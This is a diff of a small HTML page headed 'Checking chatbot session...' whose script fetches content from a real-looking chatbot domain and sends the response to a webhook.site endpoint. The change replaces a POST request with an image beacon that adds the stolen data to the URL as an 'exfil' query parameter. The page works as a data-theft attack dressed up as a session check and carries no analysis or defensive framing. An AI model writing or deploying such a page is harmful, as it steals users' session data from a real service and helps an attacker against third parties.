@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
   <body>
-    <h2>Verifying your chatbot session...</h2>
+    <h2>Checking chatbot session...</h2>
     <script>
       fetch("https://chatbot.flynas.com", {
         method: "GET",
@@ -9,11 +9,9 @@
       })
       .then(response => response.text())
       .then(data => {
-        fetch("https://webhook.site/3490c9a6-fba5-4ce1-b0cf-74707f994bff", {
-          method: "POST",
-          mode: "no-cors",
-          body: data
-        });
+        // Send as query param to your webhook using an image
+        let i = new Image();
+        i.src = "https://webhook.site/3490c9a6-fba5-4ce1-b0cf-74707f994bff?exfil=" + encodeURIComponent(data);
       });
     </script>
   </body>
